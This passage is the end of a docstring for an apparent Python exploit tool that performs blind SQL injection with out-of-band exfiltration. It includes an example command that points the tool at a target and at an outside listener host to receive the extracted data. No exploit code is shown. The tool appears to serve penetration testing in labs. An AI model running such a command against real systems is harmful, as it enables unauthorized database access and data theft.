...
Exploit Blind SQL Injection with Out-of-Band (OOB) interaction.
Supports Burp Collaborator, Webhook.site, RequestBin, or your own server.

Usage:
    python oob_sqli_exploit.py <url> <listener-url>

Example:
    python oob_sqli_exploit.py https://target.lab https://abcd1234.oastify.com
"""
